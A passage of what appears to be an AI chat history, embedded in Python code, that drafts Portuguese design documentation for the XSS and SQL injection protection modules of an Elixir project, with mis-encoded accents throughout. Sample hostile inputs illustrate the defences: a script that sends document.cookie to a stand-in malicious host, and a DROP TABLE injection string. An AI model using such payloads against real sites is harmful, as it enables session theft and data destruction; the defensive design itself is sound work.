3.  **Configura√ß√£o de Cabe√ßalhos de Seguran√ßa HTTP:** Utilizar cabe√ßalhos como Content Security Policy (CSP) para instruir o navegador sobre quais fontes de conte√∫do s√£o permitidas.

O objetivo √© garantir que o conte√∫do gerado pelo usu√°rio ou dados din√¢micos sejam exibidos de forma segura, sem permitir a execu√ß√£o de scripts indesejados. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Sanitiza√ß√£o de Strings e HTML (`sanitize_string/2`, `sanitize_html/2`):**
    *   Remover ou escapar tags HTML perigosas (ex: `<script>`, `<iframe>`, `onerror`).
    *   Remover ou escapar atributos HTML perigosos (ex: `onclick`, `onload`, `style` com URLs `javascript:`).
    *   Permitir uma lista configur√°vel de tags e atributos HTML seguros (para casos de uso como editores de rich text).
*   **Verifica√ß√£o de Strings para Padr√µes XSS (`check_string/2`):**
    *   Analisar strings de entrada para detectar padr√µes comuns de vetores XSS.
*   **Valida√ß√£o e Sanitiza√ß√£o de Par√¢metros de Requisi√ß√£o (`validate_params/2`):**
    *   Aplicar sanitiza√ß√£o XSS a par√¢metros de entrada antes de serem usados ou armazenados, se destinados √† exibi√ß√£o.
*   **Codifica√ß√£o de Sa√≠da (Contextual Escaping):**
    *   Fornecer utilit√°rios (ou garantir que as bibliotecas de template fa√ßam isso por padr√£o) para escapar dados corretamente dependendo do contexto onde ser√£o inseridos em HTML (corpo HTML, atributo HTML, JavaScript, CSS, URL).
*   **Configura√ß√£o de Cabe√ßalhos de Seguran√ßa HTTP (`security_headers/1`):**
    *   Gerar e ajudar na configura√ß√£o de cabe√ßalhos como:
        *   `Content-Security-Policy (CSP)`: Define fontes permitidas para scripts, estilos, imagens, etc.
        *   `X-XSS-Protection`: Habilita o filtro XSS em navegadores mais antigos (embora o CSP seja prefer√≠vel).
        *   `X-Content-Type-Options: nosniff`.
*   **Registro e Alerta de Tentativas de XSS (`record_xss_attempt/3`):**
    *   Logar tentativas de inje√ß√£o de XSS detectadas.
    *   Opcionalmente, notificar administradores sobre tentativas persistentes ou de alto risco.
*   **Estat√≠sticas de XSS (`get_statistics/1`):**
    *   Coletar m√©tricas sobre tentativas de XSS detectadas e bloqueadas.
*   **Configurabilidade:**
    *   Listas brancas de tags/atributos HTML seguros.
    *   Configura√ß√µes da Content Security Policy.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.XssProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para as funcionalidades de prote√ß√£o XSS.
    *   Delega para o `XssProtectionService`.
2.  **`DeeperHub.Security.XssProtection.Services.XssProtectionService` (M√≥dulo Funcional ou GenServer):**
    *   **Responsabilidade:** Cont√©m a l√≥gica principal para sanitiza√ß√£o, verifica√ß√£o e gera√ß√£o de cabe√ßalhos.
    *   **Intera√ß√µes:**
        *   Pode usar bibliotecas de sanitiza√ß√£o HTML robustas e testadas.
        *   Interage com `DeeperHub.Core.ConfigManager` para obter listas brancas de tags/atributos e pol√≠ticas CSP.
        *   Interage com `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring` para registrar tentativas de XSS.
3.  **Bibliotecas de Sanitiza√ß√£o/Escaping (Externas ou Internas):**
    *   O n√∫cleo da sanitiza√ß√£o e escaping. Se for uma biblioteca externa, este m√≥dulo atua como um wrapper configurado para ela. Phoenix Views, por exemplo, j√° fazem escaping por padr√£o em templates eex.
4.  **`DeeperHub.Security.XssProtection.Plug.XssProtectionPlug` (Phoenix Plug, Opcional):**
    *   **Responsabilidade:** Aplicar cabe√ßalhos de seguran√ßa XSS (como CSP) a todas as respostas relevantes.
    *   Pode realizar verifica√ß√µes b√°sicas em par√¢metros de entrada para todos os requests, se configurado de forma agressiva (geralmente a sanitiza√ß√£o √© mais direcionada).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/xss_protection/
‚îú‚îÄ‚îÄ xss_protection.ex                 # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ xss_protection_service.ex     # L√≥gica principal
‚îÇ
‚îú‚îÄ‚îÄ plug/                             # (Pode estar em deeper_hub_web/plugs)
‚îÇ   ‚îî‚îÄ‚îÄ xss_protection_plug.ex
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                     # Supervisor (se XssProtectionService for GenServer)
```
*(O `XssProtectionAdapter` e `XssProtectionBehaviour` da documenta√ß√£o original podem ser simplificados se o `XssProtectionService` for a implementa√ß√£o principal.)*

### 3.3. Decis√µes de Design Importantes

*   **Contextual Escaping √© Chave:** A principal defesa contra XSS √© garantir que todos os dados din√¢micos sejam escapados corretamente para o contexto em que s√£o inseridos no HTML. Frameworks como Phoenix j√° fazem isso por padr√£o em templates `.eex`. Onde a inser√ß√£o manual de HTML ocorre, ou em contextos JavaScript, a aten√ß√£o deve ser redobrada.
*   **Sanitiza√ß√£o de HTML Rico:** Se a aplica√ß√£o permite que usu√°rios insiram HTML rico (ex: atrav√©s de um editor WYSIWYG), √© crucial usar uma biblioteca de sanitiza√ß√£o robusta e configurada com uma lista branca estrita de tags e atributos permitidos. \"Listas negras\" s√£o geralmente ineficazes.
*   **Content Security Policy (CSP):** CSP √© uma camada de defesa poderosa. Definir uma pol√≠tica CSP restritiva pode mitigar significativamente o impacto de qualquer vulnerabilidade XSS que possa ter passado despercebida.
*   **N√£o Confiar na Entrada do Cliente:** Toda entrada do usu√°rio deve ser tratada como potencialmente maliciosa at√© que seja validada e/ou sanitizada/escapada.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Envia um Coment√°rio com Script Malicioso:**
    *   O usu√°rio tenta postar: `√ìtimo artigo! <script>fetch('http://malicious.com/steal_cookie=' + document.cookie)</script>`
    *   Antes de salvar ou exibir, `XssProtection.sanitize_html(comment_text)` √© chamado.
    *   O script √© removido ou escapado, resultando em: `√ìtimo artigo! &lt;script&gt;...&lt;/script&gt;` ou `√ìtimo artigo!`.
*   **Exibi√ß√£o do Nome de Usu√°rio na P√°gina:**
    *   Ao renderizar `<h1>Bem-vindo, <%= @user.name %>!</h1>`, o framework Phoenix (ou a fun√ß√£o de template) automaticamente escapa o `@user.name`. Se o nome do usu√°rio contivesse `<script>`, seria renderizado como texto literal.
*   **Configura√ß√£o de CSP:**
    *   O `XssProtectionPlug` adiciona o header `Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com` a todas as respostas HTML. Isso instrui o navegador a apenas carregar scripts do pr√≥prio dom√≠nio e de `apis.google.com`.

## üåä 5. Fluxos Importantes

### Fluxo de Sanitiza√ß√£o de Entrada para um Campo de \"Descri√ß√£o\" (que permite HTML limitado)

1.  **Usu√°rio Submete Dados:** Usu√°rio envia um formul√°rio com um campo \"descri√ß√£o\".
2.  **Controller/Servi√ßo:** Recebe os dados. Antes de persistir:
    `{:ok, sanitized_description} = DeeperHub.Security.XssProtection.sanitize_html(params[\"description\"], allow_safe_tags: true, safe_tags: [\"b\", \"i\", \"p\", \"a\"], safe_attributes: [\"href\"])`
3.  **`XssProtectionService.sanitize_html/2`:**
    *   Usa uma biblioteca de sanitiza√ß√£o HTML (ex: `HtmlSanitizeEx`).
    *   Configura a biblioteca com a lista branca de tags e atributos seguros.
    *   Processa a string de entrada, removendo ou neutralizando quaisquer tags/atributos n√£o permitidos.
4.  **Persist√™ncia:** A `sanitized_description` √© salva no banco de dados.
5.  **Exibi√ß√£o:** Ao exibir a descri√ß√£o, se ela for renderizada como HTML bruto (ex: `raw(@description)` em Phoenix), ela j√° est√° sanitizada. Se for renderizada normalmente (`<%= @description %>`), ser√° adicionalmente escapada pelo template engine, o que √© seguro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.XssProtection.sanitize_string(input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Sanitiza uma string, geralmente escapando caracteres HTML especiais para torn√°-los seguros para exibi√ß√£o como texto. Esta √© a abordagem padr√£o para a maioria das strings.
*   **`opts`:**
    *   `:context` (atom): O contexto de sa√≠da (ex: `:html_content`, `:html_attribute`, `:javascript`, `:css`, `:url`). Determina o tipo de escaping. (Padr√£o: `:html_content`)
*   **Exemplo:**
    ```elixir
    sanitized_name = XssProtection.sanitize_string(\"<script>alert(1)</script>\")
    # Resulta em: {:ok, \"&lt;script&gt;alert(1)&lt;/script&gt;\"}
    ```

### 6.2. `DeeperHub.Security.XssProtection.sanitize_html(html_input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Sanitiza uma string que se espera conter HTML, removendo tags e atributos perigosos com base em uma lista branca.
*   **`opts`:**
    *   `:allow_safe_tags` (boolean): Se `true`, usa a lista branca de tags seguras. Se `false` (padr√£o), remove todas as tags.
    *   `:safe_tags` (list(String.t)): Lista de tags HTML permitidas (ex: `[\"b\", \"i\", \"u\", \"p\", \"a\", \"img\"]`). Usado se `:allow_safe_tags` √© `true`.
    *   `:safe_attributes` (list(String.t)): Lista de atributos HTML permitidos (ex: `[\"href\", \"src\", \"alt\"]`).
    *   `:protocols_for_attribute` (map): Mapeia atributos para os protocolos de URL permitidos (ex: `%{ \"href\" => [\"http\", \"https\"], \"src\" => [\"http\", \"https\"] }`).
*   **Exemplo:**
    ```elixir
    safe_html = XssProtection.sanitize_html(
      \"<p onclick='bad()'>Hello <b>World</b> <script>evil()</script></p>\",
      allow_safe_tags: true, safe_tags: [\"p\", \"b\"]
    )
    # Resulta em: {:ok, \"<p>Hello <b>World</b> </p>\"}
    ```

### 6.3. `DeeperHub.Security.XssProtection.check_string(input :: String.t(), context :: map() | nil) :: {:ok, :safe | :suspicious} | {:error, term()}`

*   **Descri√ß√£o:** Analisa uma string em busca de padr√µes XSS conhecidos. N√£o modifica a string.
*   **Retorno:** `:safe` se nenhum padr√£o √≥bvio for encontrado, `:suspicious` se padr√µes XSS forem detectados.

### 6.4. `DeeperHub.Security.XssProtection.record_xss_attempt(input :: String.t(), source_info :: map(), context :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Registra uma tentativa de XSS detectada para auditoria e monitoramento.
*   **`source_info`:** Mapa com informa√ß√µes sobre a origem (ex: `%{ip_address: \"...\", user_id: \"...\", path: \"...\"}`).

### 6.5. `DeeperHub.Security.XssProtection.security_headers(opts :: keyword()) :: list({String.t(), String.t()})`

*   **Descri√ß√£o:** Gera uma lista de tuplas de cabe√ßalhos HTTP recomendados para prote√ß√£o XSS.
*   **`opts`:**
    *   `:csp_policy` (String.t | map): A pol√≠tica CSP a ser aplicada. Pode ser uma string ou um mapa para constru√ß√£o din√¢mica.
*   **Exemplo de Retorno:**
    ```elixir
    [
      {\"Content-Security-Policy\", \"default-src 'self'; script-src 'self'\"},
      {\"X-XSS-Protection\", \"1; mode=block\"},
      {\"X-Content-Type-Options\", \"nosniff\"}
    ]
    ```

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :xss_protection, :enabled]`** (Boolean): Habilita/desabilita as verifica√ß√µes e sanitiza√ß√µes XSS. (Padr√£o: `true`)
*   **`[:security, :xss_protection, :default_safe_tags]`** (List de Strings): Lista padr√£o de tags HTML consideradas seguras.
*   **`[:security, :xss_protection, :default_safe_attributes]`** (List de Strings): Lista padr√£o de atributos HTML considerados seguros.
*   **`[:security, :xss_protection, :default_protocols_for_href]`** (List de Strings): Protocolos padr√£o permitidos para o atributo `href`. (Padr√£o: `[\"http\", \"https\", \"mailto\"]`)
*   **`[:security, :xss_protection, :content_security_policy, :default]`** (String): A pol√≠tica CSP padr√£o a ser aplicada.
*   **`[:security, :xss_protection, :content_security_policy, :report_uri]`** (String | nil): URI para onde os navegadores devem enviar relat√≥rios de viola√ß√£o CSP.
*   **`[:security, :xss_protection, :log_suspicious_attempts]`** (Boolean): Se tentativas XSS detectadas por `check_string` devem ser logadas. (Padr√£o: `true`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging de tentativas e erros.
*   `DeeperHub.Core.Metrics`: Para m√©tricas de XSS.
*   `DeeperHub.Audit`: Para registrar tentativas bloqueadas.

### 8.2. Bibliotecas Externas

*   Uma biblioteca de sanitiza√ß√£o HTML robusta e bem testada, como `HtmlSanitizeEx`.
*   Framework Web (ex: Phoenix) para integra√ß√£o de Plugs e helpers de template que fazem escaping.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Em Phoenix Controllers/Views:**
    *   Phoenix templates (`.eex`) escapam dados por padr√£o com `<%= ... %>`. Use `<%= raw(...) %>` com extrema cautela e somente para HTML que j√° foi sanitizado por `XssProtection.sanitize_html/2`.
    *   Para dados de formul√°rio que ser√£o reexibidos, sanitize na entrada se eles puderem conter HTML permitido.
*   **Plug de CSP:** Adicionar um plug ao pipeline do Phoenix Router para injetar os headers CSP.
    ```elixir
    # lib/deeper_hub_web/plugs/csp_plug.ex
    defmodule DeeperHubWeb.Plugs.CspPlug do
      import Plug.Conn
      alias DeeperHub.Security.XssProtection

      def init(opts), do: opts

      def call(conn, _opts) do
        csp_headers = XssProtection.security_headers() # Obter CSP e outros headers
        Enum.reduce(csp_headers, conn, fn {name, value}, acc_conn ->
          put_resp_header(acc_conn, name, value)
        end)
      end
    end

    # lib/deeper_hub_web/router.ex
    pipeline :browser do
      # ...
      plug DeeperHubWeb.Plugs.CspPlug
    end
    ```
*   **Sanitiza√ß√£o de Entrada no N√≠vel de Servi√ßo:**
    ```elixir
    defmodule MyApp.CommentsService do
      alias DeeperHub.Security.XssProtection

      def create_comment(user_id, params) do
        case XssProtection.sanitize_html(params[\"body\"], allow_safe_tags: true, ...) do
          {:ok, sanitized_body} ->
            # ... persistir coment√°rio com sanitized_body ...
          {:error, _reason} ->
            # Lidar com erro de sanitiza√ß√£o (raro, mas poss√≠vel se a entrada for malformada)
            {:error, :invalid_comment_body}
        end
      end
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a fun√ß√£o `sanitize_html/2` com v√°rios vetores XSS conhecidos para garantir que s√£o neutralizados.
*   Testar com diferentes configura√ß√µes de `safe_tags` e `safe_attributes`.
*   Verificar se os headers de seguran√ßa corretos s√£o gerados por `security_headers/1`.
*   Testar a detec√ß√£o de `check_string/2`.
*   Localiza√ß√£o: `test/deeper_hub/security/xss_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.xss.input_sanitized.count` (tags: `context`)
*   `deeper_hub.security.xss.suspicious_pattern_detected.count` (tags: `context`)
*   `deeper_hub.security.xss.csp_violations_reported.count` (se um `report-uri` for usado)

### 10.3. Logs

*   **N√≠vel WARNING:** `check_string/2` detecta um padr√£o XSS suspeito. Tentativa de XSS registrada por `record_xss_attempt/3`.
*   **N√≠vel ERROR:** Falha cr√≠tica na biblioteca de sanitiza√ß√£o.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :xss, :sanitize_html, :stop]`
    *   Metadados: `%{input_length: len, output_length: len, tags_stripped_count: count}`
*   `[:deeper_hub, :security, :xss, :pattern_check, :stop]`
    *   Metadados: `%{input_sample: sample, result: :safe | :suspicious}`
*   `[:deeper_hub, :security, :csp, :violation_reported]` (se aplic√°vel)
    *   Metadados: `%{blocked_uri: uri, violated_directive: directive, document_uri: doc_uri}`

## ‚ùå 11. Tratamento de Erros

*   Se a sanitiza√ß√£o falhar (o que deve ser raro com bibliotecas robustas), a opera√ß√£o que depende da entrada sanitizada deve falhar de forma segura (ex: n√£o salvar o dado, retornar um erro gen√©rico).
*   Falhas na configura√ß√£o do CSP devem ser logadas na inicializa√ß√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Manter Bibliotecas Atualizadas:** Se depender de bibliotecas externas para sanitiza√ß√£o (como `HtmlSanitizeEx`), mant√™-las atualizadas √© crucial, pois novos vetores XSS s√£o descobertos.
*   **CSP √© uma Rede de Seguran√ßa:** CSP n√£o substitui a sanitiza√ß√£o de entrada e o escaping de sa√≠da, mas age como uma importante camada de defesa adicional.
*   **Testes Cont√≠nuos:** A efic√°cia da prote√ß√£o XSS deve ser testada regularmente, idealmente com ferramentas de seguran√ßa automatizadas.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao lidar com qualquer dado que possa ser renderizado em um navegador, pense criticamente sobre o contexto de sa√≠da e aplique a sanitiza√ß√£o/escaping apropriado.
*   Revise e atualize a pol√≠tica CSP conforme a aplica√ß√£o evolui e novas fontes de conte√∫do (scripts, estilos, iframes) s√£o adicionadas.
*   Mantenha as listas brancas de tags/atributos HTML o mais restritivas poss√≠vel.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Integrar com um servi√ßo de an√°lise de c√≥digo est√°tico para ajudar a identificar potenciais vulnerabilidades XSS no c√≥digo.
*   [ ] Implementar um modo \"report-only\" para CSP para coletar viola√ß√µes sem bloquear o conte√∫do, √∫til para testar novas pol√≠ticas.
*   [ ] Adicionar suporte para sanitiza√ß√£o de JavaScript (DOMPurify no frontend, ou regras mais estritas no backend se o JS for constru√≠do dinamicamente).
*   [ ] Desenvolver ou integrar uma biblioteca para escaping contextual mais granular se as capacidades padr√£o do framework n√£o forem suficientes para todos os casos de uso.
*   [ ] Criar um \"XSS Cheat Sheet\" interno para desenvolvedores com exemplos de vetores comuns e como se defender contra eles no contexto do DeeperHub.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Agora cobrimos CSRF e XSS. Outras √°reas de seguran√ßa importantes incluem `SqlInjectionProtection` e `PathTraversalProtection`, ou talvez `DdosProtection`. Qual delas parece mais interessante para o pr√≥ximo passo?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos seguir com o `DeeperHub.Security.SqlInjectionProtection`. Proteger o banco de dados √© absolutamente cr√≠tico.

---

# M√≥dulo: `DeeperHub.Security.SqlInjectionProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.SqlInjectionProtection`

O m√≥dulo `DeeperHub.Security.SqlInjectionProtection` √© dedicado a prevenir ataques de **Inje√ß√£o de SQL** no sistema DeeperHub. A Inje√ß√£o de SQL √© uma t√©cnica de ataque onde um invasor insere ou \"injeta\" c√≥digo SQL malicioso em campos de entrada que s√£o subsequentemente usados para construir consultas ao banco de dados. Se bem-sucedido, isso pode permitir que o invasor visualize, modifique ou exclua dados, ou at√© mesmo execute comandos no sistema operacional do servidor de banco de dados.

Este m√≥dulo foca em:
1.  **Uso de Consultas Parametrizadas (Prepared Statements):** A principal e mais eficaz defesa.
2.  **Valida√ß√£o e Sanitiza√ß√£o de Entradas:** Como uma camada secund√°ria, especialmente para entradas usadas em cl√°usulas `ORDER BY` ou outros contextos onde a parametriza√ß√£o pode ser mais dif√≠cil.
3.  **Detec√ß√£o de Padr√µes Maliciosos:** Analisar strings de consulta ou fragmentos para identificar padr√µes t√≠picos de inje√ß√£o.

O objetivo √© garantir que todas as intera√ß√µes com o banco de dados sejam seguras e que os dados fornecidos pelo usu√°rio n√£o possam ser usados para manipular consultas SQL de forma maliciosa. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Promover e Facilitar Consultas Parametrizadas:**
    *   Incentivar o uso de Ecto Changesets e `Ecto.Query` que geram consultas parametrizadas por padr√£o.
    *   Fornecer utilit√°rios para construir consultas din√¢micas de forma segura, se absolutamente necess√°rio (ex: `generate_safe_query/2`).
*   **Valida√ß√£o e Sanitiza√ß√£o de Entradas Usadas em SQL:**
    *   Validar se os valores usados em cl√°usulas din√¢micas (ex: nomes de colunas para ordena√ß√£o, dire√ß√£o de ordena√ß√£o) pertencem a uma lista branca de valores permitidos.
    *   Sanitizar strings que *precisam* ser interpoladas diretamente em fragmentos SQL (uma pr√°tica a ser evitada ao m√°ximo), escapando caracteres especiais.
*   **Detec√ß√£o de Padr√µes de Inje√ß√£o (`check_query/2`, `check_string/2`):**
    *   Analisar strings de consulta SQL completas (raramente constru√≠das manualmente) ou fragmentos de strings para identificar padr√µes suspeitos (ex: coment√°rios SQL, `UNION SELECT`, `OR 1=1`, m√∫ltiplas queries).
*   **Parametriza√ß√£o de Consultas (Helper) (`parameterize/3`):**
    *   (Menos comum com Ecto) Fornecer uma maneira de converter uma string de consulta com placeholders em uma consulta parametrizada e uma lista de par√¢metros.
*   **Registro e Alerta de Tentativas de Inje√ß√£o (`record_injection_attempt/3`):**
    *   Logar tentativas de inje√ß√£o de SQL detectadas.
    *   Notificar administradores sobre tentativas significativas ou repetidas.
*   **Estat√≠sticas de Tentativas (`get_statistics/1`):**
    *   Coletar m√©tricas sobre tentativas de inje√ß√£o detectadas e bloqueadas.
*   **Configurabilidade:**
    *   Listas brancas de identificadores SQL permitidos (nomes de tabelas/colunas para queries din√¢micas).
    *   Padr√µes de regex para detec√ß√£o de SQLi.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.SqlInjectionProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para as funcionalidades de prote√ß√£o contra SQLi.
    *   Delega para o `SqlInjectionProtectionService`.
2.  **`DeeperHub.Security.SqlInjectionProtection.Services.SqlInjectionProtectionService` (M√≥dulo Funcional ou GenServer):**
    *   **Responsabilidade:** Cont√©m a l√≥gica principal para verifica√ß√£o, sanitiza√ß√£o e gera√ß√£o segura de fragmentos de consulta.
    *   **Intera√ß√µes:**
        *   Pode usar bibliotecas de parsing SQL (limitado) ou regex para detec√ß√£o de padr√µes.
        *   Interage com `DeeperHub.Core.ConfigManager` para obter listas brancas e padr√µes de detec√ß√£o.
        *   Interage com `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring` para registrar tentativas.
3.  **Ecto e `DeeperHub.Core.Repo` (Principal Mecanismo de Defesa):**
    *   A maior parte da prote√ß√£o contra SQLi vem do uso correto do Ecto, que por padr√£o utiliza consultas parametrizadas. Este m√≥dulo `SqlInjectionProtection` serve mais como um conjunto de ferramentas para casos espec√≠ficos e para an√°lise de entradas que *poderiam* ser usadas em contextos SQL.
4.  **`DeeperHub.Shared.Utils.ValidationUtils` (para valida√ß√£o de tipos de dados):**
    *   Garantir que os dados passados para as queries Ecto tenham os tipos corretos antes de serem usados.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/sql_injection_protection/
‚îú‚îÄ‚îÄ sql_injection_protection.ex                 # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ sql_injection_protection_service.ex     # L√≥gica principal
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                     # Supervisor (se o servi√ßo for GenServer, menos prov√°vel aqui)
```
*(Os m√≥dulos `SqlInjectionProtectionAdapter` e `SqlInjectionProtectionBehaviour` da documenta√ß√£o original podem ser simplificados se o `SqlInjectionProtectionService` for a implementa√ß√£o principal e a fachada o chamar diretamente, dado que muitas fun√ß√µes s√£o puras ou baseadas em config.)*

### 3.3. Decis√µes de Design Importantes

*   **Priorizar Consultas Parametrizadas:** A primeira e mais importante linha de defesa √© usar Ecto Changesets e `Ecto.Query` com par√¢metros, em vez de construir strings SQL manualmente.
*   **Valida√ß√£o de Lista Branca para Dinamismo:** Se nomes de colunas ou tabelas precisarem ser din√¢micos (ex: ordena√ß√£o por coluna clicada pelo usu√°rio), validar esses nomes contra uma lista branca de valores permitidos. Nunca interpolar diretamente a entrada do usu√°rio.
*   **Sanitiza√ß√£o como √öltimo Recurso:** A sanitiza√ß√£o de strings (escapar ap√≥strofos, etc.) deve ser um √∫ltimo recurso e feita com extremo cuidado, apenas quando a parametriza√ß√£o n√£o for vi√°vel.
*   **Contexto do Banco de Dados:** Algumas t√©cnicas de sanitiza√ß√£o ou detec√ß√£o podem ser espec√≠ficas do dialeto SQL do banco de dados (PostgreSQL, MySQL, etc.).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Constru√ß√£o de Query Ecto com Ordena√ß√£o Din√¢mica:**
    *   Usu√°rio clica em um cabe√ßalho de tabela para ordenar por uma coluna.
    *   O nome da coluna (`sort_field`) e a dire√ß√£o (`sort_direction`) v√™m da requisi√ß√£o.
    *   **Antes de usar no Ecto `order_by`:**
        ```elixir
        allowed_sort_fields = [\"name\", \"created_at\", \"status\"]
        allowed_directions = [:asc, :desc]

        if sort_field_from_user in allowed_sort_fields and sort_direction_from_user in allowed_directions do
          from(q in query, order_by: [{^sort_direction_from_user, field(q, ^String.to_atom(sort_field_from_user))}])
        else
          # Ordena√ß√£o padr√£o ou erro
        end
        ```
    *   `SqlInjectionProtection.check_string/2` poderia ser usado no `sort_field_from_user` como uma verifica√ß√£o adicional, mas a valida√ß√£o de lista branca √© mais robusta.
*   **Log de Query Suspeita:**
    *   Um sistema de monitoramento de banco de dados detecta uma query longa ou com sintaxe incomum.
    *   A query √© enviada para `SqlInjectionProtection.check_query(suspicious_query_string)`.
    *   Se retornar `{:ok, :suspicious}`, um alerta √© gerado.
*   **Sanitiza√ß√£o de Termo de Busca para `ILIKE` (se n√£o parametriz√°vel diretamente):**
    *   (Nota: Ecto geralmente lida bem com `like` parametrizado)
    *   Se um termo de busca precisasse ser interpolado diretamente (EVITAR), ele seria sanitizado: `SqlInjectionProtection.sanitize_string(search_term, %{context: :sql_like_value})`.

## üåä 5. Fluxos Importantes

### Fluxo de Verifica√ß√£o de Entrada para Cl√°usula de Ordena√ß√£o Din√¢mica

1.  **Entrada do Usu√°rio:** Controller recebe `params = %{\"sort_by\" => \"name'; DROP TABLE users; --\", \"order\" => \"ASC\"}`.
2.  **Valida√ß√£o de Lista Branca (L√≥gica no Controller/Servi√ßo):**
    *   `sort_field = params[\"sort_by\"]`
    *   `sort_order = params[\"order\"] |> String.downcase() |> String.to_atom()`
    *   `is_valid_field = sort_field in @allowed_sort_fields`
    *   `is_valid_order = sort_order in [:asc, :desc]`
3.  **(Opcional) Verifica√ß√£o Adicional com `SqlInjectionProtection`:**
    *   `{:ok, status} = SqlInjectionProtection.check_string(sort_field)`
    *   Se `status == :suspicious`, logar/alertar, mesmo que a lista branca o negue.
4.  **Decis√£o:**
    *   Se `is_valid_field` e `is_valid_order` forem `true`, usar os valores na query Ecto.
    *   Sen√£o, usar ordena√ß√£o padr√£o ou retornar erro. **Nunca interpolar `sort_field` diretamente na query Ecto sem valida√ß√£o.**
    ```elixir
    # Exemplo seguro com Ecto
    dynamic_order_by =
      if is_valid_field and is_valid_order do
        [{sort_order, String.to_atom(sort_field)}]
      else
        # Ordena√ß√£o padr√£o
        [asc: :id]
      end
    from(p in Post, order_by: ^dynamic_order_by)
    ```

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.SqlInjectionProtection.check_string(input :: String.t(), opts :: keyword()) :: {:ok, :safe | :suspicious} | {:error, term()}`

*   **Descri√ß√£o:** Analisa uma string de entrada para detectar padr√µes comuns de SQL Injection. N√£o modifica a string.
*   **`opts`:**
    *   `:db_type` (atom): Tipo de banco de dados (ex: `:postgres`, `:mysql`) para detec√ß√£o espec√≠fica de dialeto. (Padr√£o: `:generic`)
    *   `:sensitivity` (atom): N√≠vel de sensibilidade da detec√ß√£o (`:low`, `:medium`, `:high`). (Padr√£o: `:medium`)
*   **Retorno:** `:safe` se nenhum padr√£o √≥bvio for encontrado, `:suspicious` se padr√µes forem detectados.

### 6.2. `DeeperHub.Security.SqlInjectionProtection.check_query(query_string :: String.t(), opts :: keyword()) :: {:ok, :safe | :suspicious, list(String.t())} | {:error, term()}`

*   **Descri√ß√£o:** Analisa uma string de consulta SQL completa para detectar vulnerabilidades.
*   **`opts`:** Similar a `check_string/2`.
*   **Retorno:** `{:ok, :safe | :suspicious, threats_found :: list(String.t())}`. A lista `threats_found` detalha os tipos de amea√ßas.

### 6.3. `DeeperHub.Security.SqlInjectionProtection.sanitize_string(input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Tenta sanitizar uma string escapando caracteres especiais relevantes para SQL. **Deve ser usado como √∫ltimo recurso quando a parametriza√ß√£o n√£o √© poss√≠vel.**
*   **`opts`:**
    *   `:db_type` (atom): Para escaping espec√≠fico do dialeto. (Padr√£o: `:generic`, que pode escapar ap√≥strofos).
    *   `:context` (atom): Contexto onde a string ser√° usada (ex: `:string_literal`, `:identifier`). Para identifiers, idealmente usar listas brancas.
*   **Exemplo:**
    ```elixir
    {:ok, safe_name} = SqlInjectionProtection.sanitize_string(\"O'Reilly\") 
    # safe_name pode ser \"O''Reilly\" para PostgreSQL
    ```

### 6.4. `DeeperHub.Security.SqlInjectionProtection.generate_safe_query(spec :: map(), opts :: keyword()) :: {:ok, Ecto.Query.t() | {String.t(), list()}} | {:error, term()}` (Mais Complexo)

*   **Descri√ß√£o:** (Funcionalidade avan√ßada e potencialmente complexa de implementar de forma gen√©rica e segura). Tenta gerar uma query Ecto ou uma string SQL parametrizada a partir de uma especifica√ß√£o de alto n√≠vel, validando todos os identificadores contra listas brancas.
*   **`spec`:** Um mapa descrevendo a query (tabelas, colunas, joins, where, order by, limit).
*   **`opts`:**
    *   `:allowed_tables` (list(String.t))
    *   `:allowed_columns_for_table` (mapa `%{table_name => list(String.t)}`)
*   **Retorno:** Uma query Ecto ou uma tupla `{sql_string, params}`.

